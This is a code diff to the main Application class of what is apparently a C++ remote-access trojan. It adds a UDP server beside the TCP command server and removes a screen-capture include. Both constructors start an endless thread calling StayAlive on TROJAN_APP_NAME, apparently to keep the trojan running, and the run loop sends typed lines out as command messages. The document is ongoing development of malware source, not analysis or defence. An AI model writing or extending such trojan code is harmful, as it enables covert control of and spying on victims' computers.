@@ -5,25 +5,28 @@
 #include "..\Network\Protocols\CommandMessageProtocol.hpp"
 #include "..\Service\Debugger.hpp"
 #include "..\Service\Tools.hpp"
-#include "ScreenCapturer.hpp"
+#include "..\Network\UDPServer.hpp"
 
 Application::Application() :
 	m_io(),
-	m_server(new TCPServer(m_io, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), std::atoi(DEFAULT_PORT)))),
+	m_tcp_server(new TCPServer(m_io, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), std::atoi(DEFAULT_PORT)))),
+	m_udp_server(new UDPServer(m_io, std::atoi(DEFAULT_PORT))),
 	m_thread([this]() { m_io.run(); }),
 	m_save_thread([]() { for (;;) { StayAlive(TROJAN_APP_NAME); } })
 { }
 
 Application::Application(char *argv[]) :
 	m_io(),
-	m_server(new TCPServer(m_io, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), std::atoi(argv[1])))),
+	m_tcp_server(new TCPServer(m_io, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), std::atoi(argv[1])))),
+	m_udp_server(new UDPServer(m_io, std::atoi(argv[1]))),
 	m_thread([this]() { m_io.run(); }),
 	m_save_thread([]() { for (;;) { StayAlive(TROJAN_APP_NAME); } })
 { }
 
 Application::~Application()
 {
-	delete m_server;
+	delete m_tcp_server;
+	delete m_udp_server;
 }
 
 void Application::run()
@@ -36,7 +39,7 @@ void Application::run()
 		std::memcpy(msg.get_body(), line, msg.get_body_length());
 		msg.encode_header();
 
-		m_server->write(&msg);
+		m_tcp_server->write(&msg);
 	}
 }
 
